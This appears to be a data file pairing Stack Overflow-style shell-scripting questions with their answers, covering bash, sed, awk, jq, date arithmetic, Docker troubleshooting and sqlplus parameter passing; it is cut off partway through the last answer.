    "How to concatenate strings formatted with printf in bash": "Use double quotes around $result and all other variables that may contain blanks and other special characters if they are to be used as a single argument to a program or built-in function:\nresult=$(printf '%s| %-15s| %-25s| %-15s| %-15s| %-15s\\n' \"$result\" \"$size\" \"$name\" \"$visits\" \"$inbound\" \"$outbound\")\nIf you just want to assign the result of printf to a variable (as you did), you can also use\nprintf -v result '%s| %-15s| %-25s| %-15s| %-15s| %-15s\\n' \"$result\" \"$size\" \"$name\" \"$visits\" \"$inbound\" \"$outbound\"\nBTW: there also a += assignment operator that just appends to strings (see bash man page, section PARAMETERS).\nIn the full code listing, a pipe sign is missing after the 'done' before the second 'while read i'.\nAnd when you call\necho $result\nthe contents of $result is already lost, since the printf is called in a sub process created by the pipe sign after 'do du ...'. The parent processes haven't access to the (environment) variables of the sub process.\nI'd rather rewrite the code to something like\nresult=\"\"\nfor name in /var/www/* ; do \n    read size __ < <(du -sh \"$name\")\n    name=${name##*/}\n    #insert the other stuff here and add arguments to printf\n    printf -v line '| %-15s| %-25s\\n' \"$size\" \"$name\"\n    result+=$line\ndone\necho \"$result\"\nThe read < <(cmd) expression is similar to cmd | read but the former puts the command in the sub process instead, while the read is executed in the main process. This way, the variables set by read can be used in subsequent commands, too.",
    "Respect last line if it's not terminated with a new line char (\\n) when using read": "read does, in fact, read an unterminated line into the assigned var ($REPLY by default). It also returns false on such a line, which just means \u2018end of file\u2019; directly using its return value in the classic while loop thus skips that one last line. If you change the loop logic slightly, you can process non-new line terminated files correctly, without need for prior sanitisation, with read:\nwhile read -r || [[ -n \"$REPLY\" ]]; do\n    # your processing of $REPLY here\ndone < \"/path/to/file\"\nNote this is much faster than solutions relying on externals.\nHat tip to Gordon Davisson for improving the loop logic.",
    "bash / sh -c not working with multiple pipes": "Your $5 is getting evaluated too early. Change it to \\$5.\nIf you were to replace bash with echo, you would see that $5 is being replace by the empty string:\n % echo \"dmesg | grep 'Attached SCSI disk' | awk '{ print $5}'\"\n dmesg | grep 'Attached SCSI disk' | awk '{ print }'\nSo, when bash evaluates the command, awk is going to print the entire line, not the fifth field.\nWhen you escape the dollar sign (by pre-prending with a backslash), the variable $5 is preserved:\n% echo \"dmesg | grep 'Attached SCSI disk' | awk '{ print \\$5}'\"\ndmesg | grep 'Attached SCSI disk' | awk '{ print $5}'",
    "echo >> style appending, but to the beginning of a file": "In 2 steps:\ncontent=$(cat file.txt) # no cat abuse this time\necho -en \"foobar\\n$content\" >file.txt",
    "Linux Script- Date Manipulations": "Here's how to perform the manipulations using GNU date:\n#!/bin/sh\n\nUSER_DATE=JUN-08-2011\n\n# first day of the month\nFIRST_DAY_OF_MONTH=$(date -d \"$USER_DATE\" +%b-01-%Y)\n\nPREVIOUS_DAY=$(date -d \"$USER_DATE -1 days\" +%b-%d-%Y)\n\n# last day of the month\nFIRST_DAY_NEXT_MONTH=$(date -d \"$USER_DATE +1 month\" +%b-01-%Y)\nLAST_DAY_OF_MONTH=$(date -d \"$FIRST_DAY_NEXT_MONTH -1 day\" +%b-%d-%Y)\n\necho \"User date: $USER_DATE\"\necho \"1. First day of the month: $FIRST_DAY_OF_MONTH\"\necho \"2. Previous day: $PREVIOUS_DAY\"\necho \"3. Last day of the month: $LAST_DAY_OF_MONTH\"\nThe output is:\nUser date: JUN-08-2011\n1. First day of the month: Jun-01-2011\n2. Previous day: Jun-07-2011\n3. Last day of the month: Jun-30-2011",
    "How can I grab the color of a pixel on my desktop? (Linux)": "This does the trick, but requires python-gtk:\nimport gtk.gdk\nimport sys\n\ndef PixelAt(x, y):\n    w = gtk.gdk.get_default_root_window()\n    sz = w.get_size()\n    pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])\n    pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])\n    pixel_array = pb.get_pixels_array()\n    return pixel_array[y][x]\n\nprint PixelAt(int(sys.argv[1]), int(sys.argv[2]))\nOn Ubuntu 9.10, this also requires python-numpy or it segfaults the python interpreter on the get_pixels_array line. Ubuntu 10.04 it still has this requirement, or it causes an ImportError regarding numpy.core.multiarray.",
    "Python: Persistent shell variables in subprocess": "subprocess.Popen takes an optional named argument env that's a dictionary to use as the subprocess's environment (what you're describing as \"shell variables\"). Prepare a dict as you need it (you may start with a copy of os.environ and alter that as you need) and pass it to all the subprocess.Popen calls you perform.",
    "Dynamodb local web shell does not load": "",
    "What is the difference between base64 and MIME base 64? [closed]": "This is not a Perl vs. everyone else thing; this is a \"using Bash's <<< construct\" vs. \"not doing that\" thing. Though not explicitly documented (at least not in the manpage on Ubuntu Xenial), Bash appends a newline to herestrings (the <<< thing) when passing them to commands. As a result, all of the commands you're invoking with <<< are actually encoding 'ASDF1234asdf\\n', while Perl (which isn't invoked with a herestring) is encoding just 'ASDF1234asdf'. Different input, different output.\nIn order to pass a string without a trailing newline to a command's standard input, use the printf command, e.g.:\n$ printf %s ASDF1234asdf | base64\nQVNERjEyMzRhc2Rm",
    "n days ago from a given date on command line": "Just mention the date you want to extract two days from:\n$ date -d \"2016-12-31 2 days ago\" +%Y-%m-%d\n2016-12-29\nOr a bit better grammatically-wise:\n$ date -d \"2016-12-31 -2 days\" +%Y-%m-%d\n2016-12-29",
    "Optimize shell script for multiple sed replacements": "You can use sed to produce correctly -formatted sed input:\nsed -e 's/^/s|/; s/$/|g/' replacement_list | sed -r -f - file",
    "Taking logcat and kernel logs simultaneously": "",
    "Are Unix/Linux pipes producer or consumer driven?": "Pipes in Unix have a buffer, so even if the right side process (RSP) does not consume any data, the left side process (LSP) is able to produce a few kilobytes before blocking.\nThen, if the buffer gets full, the LSP is eventually blocked. When the RSP reads data it frees part or all of the buffer space and the LSP resumes the operation.\nIf instead of 2 processes you have 3, the situation is more or less the same: a faster producer is blocked by a slower consumer. And obviously, a faster consumer is blocked by a slower producer if the pipe gets empty: just think of an interactive shell, waiting of the slowest producer of all: the user.\nFor example the following command:\n$ yes | cat | more\nSince more blocks when the screen is full, until the user presses a key, the cat process will fill its output buffer and stall, then the yes process will fill its buffer and also stall. Everything waiting for the user to continue, as it should be.\nPS: As an interesting fact is: what happens when the more process ends? well, the right side of that pipe is closed, so the cat process will get a SIGPIPE signal (if it ever writes again in the pipe, and it will) and will die. The same will happen to the yes process. All processes die, as it should be.",
    "List the first few lines of every file in a directory": "Use head command:\nhead -3 /path/to/dir/*",
    "In zsh function, how to echo a command": "setopt verbose\nPut that wherever you want to start echoing commands as they are run, and when you don't want that behavior, use\nunsetopt verbose\nP.S. I realize this thread is too old to answer the original questioner, but wanted to help anyone who runs across this question in the future.",
    "to insert line breaks in a file whenever a comma is encountered-Shell script": "Using GNU sed:\nsed 's/, /\\n/g' your.file\nOutput:\nthis\nis a file\nthat should\nbe added\nwith a\nline break\nwhen we find a\na comma. \nNote: the syntax above will work only on system that have the \\n as line delimiter as Linux and the most UNIXes.\nIf you need a portal solution in a a script then use the following expression that uses a literal new line instead of \\n:\nsed 's/,[[:space:]]/\\\n/g' your.file\nThanks @EdMorten for this advice.",
    "Why does bash not stop on error for failures in sequence of short-circuited commands?": "The logic here is that your use of && already is error-checking. The same way bash doesn't treat a failure within an if condition as worth aborting, even with set -e.\nWhen you wrap the commands in a parenthesis, you are actually running those commands within a subshell, so the script itself only sees the return of that subshell, ie: it isn't aware that && is involved at all, so it aborts as you expect.",
    "Shell GNU-Screen -X Stuff problems": "Adding the argument -p 0 should fix it. Something like this:\nscreen -x $PROCESS -p 0 -X stuff `printf \"stop\\r\"`\n(From screen documentation: -p window Preselect the named window if it exists.)",
    "Stop Python from generating pyc files in shebang [duplicate]": "it is possible by putting your python interperter path directly in the she bang instead of using env.\n#!/usr/bin/python -B\nof course this means you lose out on some of the portability benefits of using env. There is a discussion of this issue with env on the wikipedia Shebang page. They use python as one of their env examples.",
    "How to make script in linux use my interpteter and work? (#!)": "Your shell must accept command line arguments. In this case, your program will be called like this:\n/home/arbuz/Patryk/projekt/a.out your_script\nSo you'll need a main() of this signature:\nint main(int argc, char* argv[])\nand then parse the arguments. argc contains the amount of arguments. The script's filename is passed in argv[1]. You'll need to open it (using fopen()) and read commands from it instead of stdin. You should probably make sure that your shell ignores the first line of a file if it starts with a #.\nIf your script is called without an absolute path (a path that doesn't start with a /), then the filename is relative to the current directory. You can get that from the environment or programmatically with getcwd().",
    "Grab nth occurrence in between two patterns using awk or sed": "This might work for you (GNU sed):\n'sed -n '/category/{:a;N;/done/!ba;x;s/^/x/;/^x\\{3\\}$/{x;p;q};x}' file\nTurn off automatic printing by using the -n option. Gather up lines between category and done. Store a counter in the hold space and when it reaches 3 print the collection in the pattern space and quit.\nOr if you prefer awk:\nawk  '/^category/,/^done/{if(++m==1)n++;if(n==3)print;if(/^done/)m=0}'  file",
    "A better way to do git clone": "bash function to do this (works in zsh also):\nfunction lazyclone {\n    url=$1;\n    reponame=$(echo $url | awk -F/ '{print $NF}' | sed -e 's/.git$//');\n    git clone $url $reponame;\n    cd $reponame;\n}\nThe awk command prints the part after the last / (e.g from http://example.com/myrepo.git to myrepo.git). The sed command removes the trailing .git\nUsage:\n$ pwd\n~/\n$ lazyclone https://github.com/dbr/tvdb_api.git\ntvdb_api\nCloning into 'tvdb_api'...\nremote: Counting objects: 1477, done.\nremote: Compressing objects: 100% (534/534), done.\nremote: Total 1477 (delta 952), reused 1462 (delta 940)\nReceiving objects: 100% (1477/1477), 268.48 KiB | 202 KiB/s, done.\nResolving deltas: 100% (952/952), done.\n$ pwd\n~/tvdb_api",
    "Why uniq -c output with space instead of \\t?": "Try this:\nuniq -c | sed -r 's/^( *[^ ]+) +/\\1\\t/'",
    "exiting shell script with background processes": "From memory a login shell will be kept around even when it finishes if any of its still running children have standard (terminal) file handles open. Normal (sub process) shells do not seem to suffer from this. So see if changing your nohup line to the following makes any difference.\nnohup myInScript.sh >some.log 2>&1 </dev/null &\nOn Centos5 I do not get the problem if I run parent.sh. But I do if I run ssh localhost parent.sh. In this case the I/O redirection I showed above solves the problem.",
    "how to source a shell script [environment variables] in perl script without forking a subshell?": "Child environments cannot change parent environments. Your best bet is to parse env.sh from inside the Perl code and set the variables in %ENV:\n#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nsub source {\n    my $name = shift;\n\n    open my $fh, \"<\", $name\n        or die \"could not open $name: $!\";\n\n    while (<$fh>) {\n        chomp;\n        my ($k, $v) = split /=/, $_, 2;\n        $v =~ s/^(['\"])(.*)\\1/$2/; #' fix highlighter\n        $v =~ s/\\$([a-zA-Z]\\w*)/$ENV{$1}/g;\n        $v =~ s/`(.*?)`/`$1`/ge; #dangerous\n        $ENV{$k} = $v;\n    }\n}\n\nsource \"env.sh\";\n\nfor my $k (qw/foo bar baz quux/) {\n    print \"$k => $ENV{$k}\\n\";\n}\nGiven\nfoo=5\nbar=10\nbaz=\"$foo$bar\"\nquux=`date +%Y%m%d`\nit prints\nfoo => 5\nbar => 10\nbaz => 510\nquux => 20110726\nThe code can only handle simple files (for instance, it doesn't handle if statements or foo=$(date)). If you need something more complex, then writing a wrapper for your Perl script that sources env.sh first is the right way to go (it is also probably the right way to go in the first place).\nAnother reason to source env.sh before executing the Perl script is that setting the environment variables in Perl may happen too late for modules that are expecting to see them.\nIn the file foo:\n#!/bin/bash\n\nsource env.sh\n\nexec foo.real\nwhere foo.real is your Perl script.",
    "Tomcat 9 running on docker - Cannot find /usr/local/tomcat/bin/setclasspath.sh": "We just stumbled over this very problem today.\nWe have an Ubuntu 18.04 server that was upgraded from 16.04. The versions of the docker packages read:\ndocker-ce/now 5:19.03.1~3-0~ubuntu-xenial amd64\ndocker-ce-cli/now 5:19.03.1~3-0~ubuntu-xenial amd64\ndocker-compose/bionic,bionic,now 1.17.1-2 all\nKernel is: 4.15.0-154-generic x86_64\nOn this machine, running a current version of tomcat:9-jre11 [0] results in the same problem as depicted in your question.\nTo narrow it down, we just started a bash like this:\ndocker run -it --rm --entrypoint=/bin/bash tomcat:9-jre11\nNow here comes the strange behavior you observed, which is completely unrelated to tomcat:\nroot@f338debf92f6:/usr/local/tomcat# [[ -r /bin/bash ]]\nroot@f338debf92f6:/usr/local/tomcat# echo $?\n1\nOn any other machine we tested, the result is as expected, e.g.:\nroot@0083a80a9ec2:/usr/local/tomcat# [[ -r /bin/bash ]]\nroot@0083a80a9ec2:/usr/local/tomcat# echo $?\n0\nUnfortunately I was not able to reproduce the behavior using a freshly installed Ubuntu 18.04. I even downgraded the kernel version and installed docker from the xenial repo.\nTrying to google a solution I found: https://github.com/alpinelinux/docker-alpine/issues/156#issuecomment-912645029\nSo I tried strace, and here the problem is visible:\nOn our Ubuntu 18.04:\n...\nread(255, \"#!/bin/bash\\n[[ -r /bin/bash ]]\\n\", 31) = 31\nfaccessat2(AT_FDCWD, \"/bin/bash\", R_OK, AT_EACCESS) = -1 EPERM (Operation not permitted)\nread(255, \"\", 31)                       = 0\n...\nAnd on any other machine I tested:\n...\nread(255, \"#!/bin/bash\\n[[ -r /bin/bash ]]\\n\", 31) = 31\nfaccessat2(AT_FDCWD, \"/bin/bash\", R_OK, AT_EACCESS) = -1 ENOSYS (Function not implemented)\nfaccessat(AT_FDCWD, \"/bin/bash\", R_OK)  = 0\nread(255, \"\", 31) \n...\nResearching the faccessat2 system call shows that it should not return EPERM [1]. I could not quite pinpoint where this behavior is introduced - somewhere between glibc and seccomp, but it all boils down to the runtime being too old for this new syscall.\nHere are the solutions we came up with:\nUpgrade your machine - this might not be feasible, though :)\nUse a tomcat image based on an older version of Debian/Ubuntu. For us tomcat:9.0.64-jre11-openjdk-slim-bullseye worked fine.\nRun the container using the --privileged switch. This circumvents the syscall privilege problem, but would be generally a bad idea\nReferences\ndigest sha256:f0c2eb420166a7d609c0031699e0778e11256f280cc2bfb5bfd61cde7ae45c61\nhttps://man7.org/linux/man-pages/man2/faccessat.2.html",
    "Exclude hidden files and folders in linux find": "Exclude files and folders starting with a . or an @:\nfind /path/to/start/search/ -not -path '*/[@.]*' -type f -mtime -2\nExclude files starting with a . and files and folders starting with a . or an @:\nfind /path/to/start/search/ -not -path '*/.*' -type f -mtime -2 | grep -v '/@.*/.*'",
    "How to list directory size of all child directories? [closed]": "The simplest is:\ndu -h --max-depth=1 parent\nThis will show all sizes of the children of parent If you also want the grandchildren, you can do\ndu -h --max-depth=2 parent\nIf you want the whole family\ndu -h parent\nAll these will just summarize the total directory size of each subdirectory up to a given level (except the last, it will give for all)\nIf you don't want the content of the subdirectories, add the -S flag.",
    "Jenkins : java.io.IOException: Cannot run program \"node\": error=2, No such file or directory": "",
    "xcodebuild is not compiling the project unless it is opened using Xcode atleast only once for cocoapods integrated project": "",
    "Iterate through dictionaries jq - shell": "The problem with your code is that an array initialization in bash looks like this:\ndeclare -a arr=(item1 item2 item3)\nItems are separated by space or newline. You can also use:\ndeclare -a arr(\n    item1\n    item2\n    item3\n)\nHowever, the jq output in the example contains both spaces and newlines, that's why the reported behaviour is as expected.\nWorkaround:\nI would get the keys first, pipe them to a read loop and then call jq for each item of the list:\njq -r '.images|keys[]' Contents.json | while read key ; do\n    echo \"image --$(jq \".images[$key]\" Contents.json)\"\ndone\nYou can also use this jq command if you don't care about pretty printing:\njq -r '.images[]|\"image --\" + tostring' Contents.json\nTo access a certain property of the subarray you can use:\njq -r '.images|keys[]' Contents.json | while read key ; do\n    echo \"image --$(jq \".images[$key].filename\" Contents.json)\"\ndone\nThe above node will print the filename property for each node for example.\nHowever this can be expressed much simpler using jq only:\njq -r '.images[]|\"image --\" + .filename' Contents.json\nOr even simpler:\njq '\"image --\\(.images[].filename)\"' Contents.json",
    "make bash script display system event dialog, then take its result and use it in an if statement": "Yes, it is possible in bash to take the output of an osascript dialog. Here\u2019s an example with a Yes/No dialog box:\n#!/bin/bash\n\nSURETY=\"$(osascript -e 'display dialog \"Are you sure you want to partition this disk?\" buttons {\"Yes\", \"No\"} default button \"No\"')\"\n\nif [ \"$SURETY\" = \"button returned:Yes\" ]; then\n    echo \"Yes, continue with partition.\"\nelse\n    echo \"No, cancel partition.\"\nfi\nIf you run this script, the script should echo the appropriate line depending on which button was pressed.\nIt also shows how to set the default button, which I am assuming for the example is \u201cNo\u201d.\nIf you have a more complex dialog, you would most likely use a regex to detect the responses, as you do in your own sample; though depending on your use case you might want to guard against spoofing responses.",
    "How to delete a network profile from etc/wpa_supplicant/wpa_supplicant.conf through command line / shell script": "using wpa_cli you can do this:\n1:\nwpa_cli remove_network 0\nwhere 0 is the network_id you get after running wpa_cli add_network. It will remove the network and disconnect any interface using it.\nNote that the network id is not the order of the network in the file. you can get configured network using wpa_cli list_networks\n2:\nwpa_cli save_config\nThis will persist the changes and the corresponding network block will be removed from etc/wpa_supplicant/wpa_supplicant.conf",
    "BASH: Is there a way to automatically save recent lines to my bash history during a period of inactivity?": "You can use history command with -a option:\nhistory\n-a     Append the ``new'' history lines  (history  lines  entered  since  the\n       beginning of the current bash session) to the history file.\nYou can write each and every command to history file at once with a little help of PROMPT_COMMAND function:\nPROMPT_COMMAND\nIf set, the value is executed as a command  prior  to  issuing  each  primary prompt.\nSo just put this into .bashrc\nPROMPT_COMMAND=\"history -a\"",
    "How to set PATH on Windows through R \"shell\" command": "",
    "Bash alias create file with current timestamp in filename": "Use single quotes to prevent immediate expansion.\nalias unix='echo $(date +%s)'\nUpdate: While I'm happy to have been able to explain the different expansion behavior between single and double quotes, please also see the other answer, by Robby Cornelissen, for a more efficient way to get the same result. The echo is unnecessary here since it only outputs what date already would output by itself. Therefore, date doesn't need to be run in a subshell.",
    "How to rename files using Zsh shell and `sed` command on Mac OSX": "If you're using zsh, you don't need to use sed: there's a zsh module called zmv that'll achieve this pretty simply:\n$ ls -F -G\nFile-A-B.gif  File-C-D.gif  File-E-F.gif\n\n$ zmv -n 'File-(*)-(*).gif' 'File-${1}${2}.gif'\nmv -- File-A-B.gif File-AB.gif\nmv -- File-C-D.gif File-CD.gif\nmv -- File-E-F.gif File-EF.gif\nNote: Omit -n to get it to actually run.\nIt works by matching things inside brackets. In this case: File-(*)-(*).gif will both match File-A-B.gif and also save A and B so we can refer to them later. Then, we move the file we've just matched to a new filename, omitting the hyphen between the two letters and inserting the letters using references: File-${1}${2}.gif.\nIt's quite a powerful little module, provided you can give it the two regexes: one to match files to rename, and the second to match the renamed-file name.",
    "how can I use linux command sed to process Little-endian UTF-16 file": "If the file is UTF-16 encoded text (as RDP is), and that is not your current encoding (it's not likely to be on Linux) then you can pre- and post-process the file with iconv. For example:\niconv -f utf-16 -t us-ascii <rdpzhitong.rdp |\n sed 's/original/modified/' |\n iconv -f us-ascii -t utf-16 >rdpzhitong.rdp.modified",
    "Executing Shell Script from current directory without '\"./filename\"": "You can execute it without ./ by using:\nsh testfile\nOr\nsh /path/to/file/testfile\nEdit\nIf you want to execute the program directly with a command, what you can do is to define an alias:\nalias execute_testfile=\"sh /path/to/file/testfile\"\nAnd then, you will execute the program whenever you write\nexecute_testfile\nor whatever name you define.\nTo make this alias persistent, do include the alias ... line in your ~/.profile or ~/.bash_profile files.",
    "How to execute shell builtin from Scala": "When strings are converted to a shell command, parameters are separated by space. The conventions you tried are shell conventions, so you'd need a shell to begin with to apply them.\nIf you want more control over what each parameter is, use a Seq[String] instead of a String, or one of the Process factories that amount to the same thing. For example:\nSeq(\"sh\", \"-c\", \"ulimit -n\").!!",
    "Deleting content of folder with shell script": "Glob expansion doesn't happen inside quotes.\nTry:\nrm -r -- \"$DIR\"*\n(Just make really sure you don't put a space after the quotes.)",
    "How do I get a list of all available shell commands": "You could use compgen. For example:\ncompgen -c\nYou also could grep it, like this:\ncompgen -c | grep top$\nSource: http://www.cyberciti.biz/open-source/command-line-hacks/compgen-linux-command/",
    "Store grep output containing whitespaces in an array": "Array elements are split on the IFS value. If you want to split on newline, adjust IFS:\nIFS_backup=$IFS\nIFS=$'\\n'\ndevices=($(sudo blkid | egrep '^/dev/sd[b-z]'))\nIFS=$IFS_backup\necho ${#devices[@]}",
    "debugging /etc/init.d startup scripts in Ubuntu": "I found adding the following near the top of my /etc/init.d/scriptname was all I needed:\ndebug_me=true\n\nif [[ $debug_me == true ]]; then\n\n  # Close STDOUT\n  exec 1<&-\n  # Close STDERR\n  exec 2<&-\n\n  LOG_FILE=/home/myhome/scriptname.log\n\n  # Open STDOUT as $LOG_FILE file for read and write.\n  exec 1<>$LOG_FILE\n\n  # Redirect STDERR to STDOUT\n  exec 2>&1\n\n  # Display shell commands with expanded args\n  set -x\n\nfi",
    "How do I launch a program inside a shell script and have the shell script continue, even though the program remains open": "Adding an & to a command places it in background.\nexample:\n/path/to/foo    \n/path/to/bar     # not executed untill foo is done\n\n\n/path/to/foo &    # in background\n/path/to/bar &    # executes as soon as foo is started\nRead more about job-control here and here",
    "What are these shell escape characters?": "I don't know where they're coming from (something to do with your shell prompt, obviously, but it's hard to say more than that).\nI read them as:\nESC[1G - Move to column 1 (Cursor Character Absolute)\nESC[0K - Erase to right\nESC[9G - Move to column 9\nIt looks like an attempt by the shell to ensure that the prompt is at the far left of an empty line. Not sure what shell you have, but zsh does something similar when the PROMPT_SP option is enabled. I don't think it uses the above sequences, though.\nMany, many, control sequences can be found here. Note that the sequence \"ESC[\" is interpreted as a \"Control Sequence Introducer\" (CSI) and is shown as that on that page.",
    "How to do date calculations in Shell Scripting?": "You can use the -d flag for the date command:\n-d, --date=STRING\n     display time described by STRING, not 'now'\nSo, just change your date variable to:\nDATE=`date +%m%d%Y -d \"3 days ago\"`",
    "Turn an application or script into a shell command": "Add a shebang line at the beginning of your file:\n#!/usr/bin/env python\nMake your file executable by calling\nchmod +x app.py\nin the shell.\nMove it to some location included in the PATH environment variable and rename it to app. Alternatively, add the path of the directory containing app to the PATH environment variable by adding the line\nexport PATH=$PATH:/path/to/app\nto your .bash_profile.",
    "How can I open a list of URLs on Windows": "With chrome it's not hard.\n$chrome = (gi ~\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe ).FullName\n$urls = \"stackoverflow.com\",\"slate.com\"\n$urls | % { & $chrome $_ }",
    "Bash monitor disk usage": "#!/bin/bash\nsource /etc/profile\n\n# Device to check\ndevname=\"/dev/sdb1\"\n\nlet p=`df -k $devname | grep -v ^File | awk '{printf (\"%i\",$3*100 / $2); }'`\nif [ $p -ge 90 ]\nthen\n  df -h $devname | mail -s \"Low on space\" my@email.com\nfi\nCrontab this to run however often you want an alert\nEDIT: For multiple disks\n#!/bin/bash\nsource /etc/profile\n\n# Devices to check\ndevnames=\"/dev/sdb1 /dev/sda1\"\n\nfor devname in $devnames\ndo\n  let p=`df -k $devname | grep -v ^File | awk '{printf (\"%i\",$3*100 / $2); }'`\n  if [ $p -ge 90 ]\n  then\n    df -h $devname | mail -s \"$devname is low on space\" my@email.com\n  fi\ndone",
    "UNIX evaluate expression from a variable": "You can do it this way\nvar2=$(($var1))",
    "Check if an app is installed on macOS using the Terminal": "The command:\nmdfind \"kMDItemKind == 'Application'\"\nwill output a list of installed Apps on the system (one per line) with their paths. E.g.:\n/Applications/Safari Technology Preview.app\n/Applications/Safari.app\nYou can search your supported browsers in this list.",
    "How to get jq to print valid json after applying a filter": "",
    "passing password to curl on command line": "You can use:\ncurl -u abcuser:trialrun https://xyz.abc.comp\nIn your script:\ncurl -u ${user}:${pass} ${url}\nTo read from stdin:\ncurl  https://xyz.abc.com -K- <<< \"-u user:password\"\nWhen using -K, --config specify - to make curl read the file from stdin\nThat should work for HTTP Basic Auth, from the curl man:\n-u, --user <user:password>\n\n Specify the user name and password to use for server authentication. ",
    "multi-line commands in Julia": "Julia automatically continues parsing in the next line if the current expression is incomplete, e.g.,\njulia> 1 +\n       2\n3\nTherefore, you can simply do\njulia> run(`\n           echo \n           123\n           345\n           678\n       `)\n123 345 678",
    "How to iterate over each output of awk with sh?": "Process Substitution is a bash extension - not specified by POSIX. This is sh compatible..\n#!/bin/sh\n\nawk -F '\\t' '$1 == 1 {print $0}' test.bed  | while read line; do\necho $line\n    # ... more code ... #\ndone",
    "Correct usage of bc in a shell script?": "bc is a command-line utility, not some obscure part of shell syntax. The utility reads mathematical expressions from its standard input and prints values to its standard output. Since it is not part of the shell, it has no access to shell variables.\nThe shell pipe operator (|) connects the standard output of one shell command to the standard input of another shell command. For example, you could send an expression to bc by using the echo utility on the left-hand side of a pipe:\necho 2+2 | bc\nThis will print 4, since there is no more here than meets the eye.\nSo I suppose you wanted to do this:\na=2.77\nb=2.0\nfor c in $(seq 0. 0.001 0.02); do\n  echo \"$a * $b * $c\" | bc\ndone\nNote: The expansion of the shell variables is happening when the shell processes the argument to echo, as you could verify by leaving off the bc:\na=2.77\nb=2.0\nfor c in $(seq 0. 0.001 0.02); do\n  echo -n \"$a * $b * $c\" =\n  echo \"$a * $b * $c\" | bc\ndone\nSo bc just sees numbers.\nIf you wanted to save the output of bc in a variable instead of sending it to standard output (i.e. the console), you could do so with normal command substitution syntax:\na=2.77\nb=2.0\nfor c in $(seq 0. 0.001 0.02); do\n  d=$(echo \"$a * $b * $c\" | bc)\n  echo \"$d\"\ndone",
    "bash - echo: write error: invalid argument": "I had this problem too in Docker on Alpine linux environment. I think the problem is that echo by default put a newline character at the end of the string, and the kernel not accept it, but it is not the case in every system. In Docker I had this error, but the value was written despite the error message.\nThe solution (in Bash): echo -n disable >/sys/firmware/acpi/interrupts/gpe66. This way no newline is echoed.",
    "Launching a shell script when Button Pressed on GUI made with Qt": "You could make it either blocking or non-blocking. It depends on whether you would like to block your main process or run the shell script in the background in an async mode.\nAlso, since you do not need the output, you do not even need to instantiate here, just use the static methods.\nBlocking code\n#include <QString>\n#include <QFileDialog>\n#include <QProcess>\n#include <QDebug>\n\n...\n\n// Get this file name dynamically with an input GUI element, like QFileDialog\n// or hard code the string here.\n\nQString fileName = QFileDialog::getOpenFileName(this,\ntr(\"Open Script\"), \"/\", tr(\"Script Files (*.sh)\"));\n\nif (QProcess::execute(QString(\"/bin/sh \") + fileName) < 0)\n    qDebug() << \"Failed to run\";\nNon-blocking\n#include <QString>\n#include <QFileDialog>\n#include <QProcess>\n#include <QDebug>\n\n...\n\n// Get this file name dynamically with an input GUI element, like QFileDialog\n// or hard code the string here.\n\nQString fileName = QFileDialog::getOpenFileName(this,\ntr(\"Open Script\"), \"/\", tr(\"Script Files (*.sh)\"));\n\n// Uniform initialization requires C++11 support, so you would need to put\n// this into your project file: CONFIG+=c+11\n\nif (!QProcess::startDetached(\"/bin/sh\", QStringList{fileName}))\n    qDebug() << \"Failed to run\";",
    "How to list only the dot files and dot folder names (without the content in them)": "try:\nls -d .*\nfyi\n   -d, --directory\n          list directories themselves, not their contents\nif your ls is not alias of other command, the output of above ls -d .* will output files/dirs in same line. If you want to have them each in its own line:\nls -d1 .*\nif you want colored output:\nls -d1 --color=auto .*",
    "Shell - How to deal with find -regex?": "You can do:\nfind test -type d -regex '.*/course[0-9.]*'\nit will match files whose name is course plus an amount of numbers and dots.\nFor example:\n$ ls course*\ncourse1.23.0  course1.33.534.1  course1.a  course1.a.2\n$ find test -type d -regex '.*course[0-9.]*'\ntest/course1.33.534.1\ntest/course1.23.0",
    "Launch nano editor passing piped command": "if you want to nano to open stdin use dash-notation (-):\necho \"foo\" | nano -\nin your case this would translate to\ncat /var/log/qmail/current | tai64nlocal | nano -",
    "how to pass variable from shell script to sqlplus": "You appear to have a heredoc containing a single SQL*Plus command, though it doesn't look right as noted in the comments. You can either pass a value in the heredoc:\nsqlplus -S user/pass@localhost << EOF\n@/opt/D2RQ/file.sql BUILDING\nexit;\nEOF\nor if BUILDING is $2 in your script:\nsqlplus -S user/pass@localhost << EOF\n@/opt/D2RQ/file.sql $2\nexit;\nEOF\nIf your file.sql had an exit at the end then it would be even simpler as you wouldn't need the heredoc:\nsqlplus -S user/pass@localhost @/opt/D2RQ/file.sql $2\nIn your SQL you can then refer to the position parameters using substitution variables:\n...\n}',SEM_Models('&1'),NULL,\n...\nThe &1 will be replaced with the first value passed to the SQL script, BUILDING; because that is a string it still needs to be enclosed in quotes. You might want to set verify off to stop if showing you the substitutions in the output.\nYou can pass multiple values, and refer to them sequentially just as you would positional parameters in a shell script - the first passed parameter is &1, the second is &2, etc. You can use substitution variables anywhere in the SQL script, so they can be used as column aliases with no problem - you just have to be careful adding an extra parameter that you either add it to the end of the list (which makes the numbering out of order in the script, potentially) or adjust everything to match:\nsqlplus -S user/pass@localhost << EOF\n@/opt/D2RQ/file.sql total_count BUILDING\nexit;\nEOF\nor:\nsqlplus -S user/pass@localhost << EOF\n@/opt/D2RQ/file.sql total_count $2\nexit;\nEOF\nIf total_count is being passed to your shell script then just use its positional parameter, $4 or whatever. And your SQL would then be:\nSELECT COUNT(*) as &1\nFROM TABLE(SEM_MATCH(\n'{\n        ?s rdf:type :ProcessSpec .\n        ?s ?p ?o\n}',SEM_Models('&2'),NULL,\nSEM_ALIASES(SEM_ALIAS('','http://VISION/DataSource/SEMANTIC_CACHE#')),NULL));\nIf you pass a lot of values you may find it clearer to use the positional parameters to define named parameters, so any ordering issues are all dealt with at the start of the script, where they are easier to maintain:\ndefine MY_ALIAS = &1\ndefine MY_MODEL = &2\n\nSELECT COUNT(*) as &MY_ALIAS\nFROM TABLE(SEM_MATCH(\n'{\n        ?s rdf:type :ProcessSpec .\n        ?s ?p ?o\n}',SEM_Models('&MY_MODEL'),NULL,\nSEM_ALIASES(SEM_ALIAS('','http://VISION/DataSource/SEMANTIC_CACHE#')),NULL));\nFrom your separate question, maybe you just wanted:\nSELECT COUNT(*) as &1\nFROM TABLE(SEM_MATCH(\n'{\n        ?s rdf:type :ProcessSpec .\n        ?s ?p 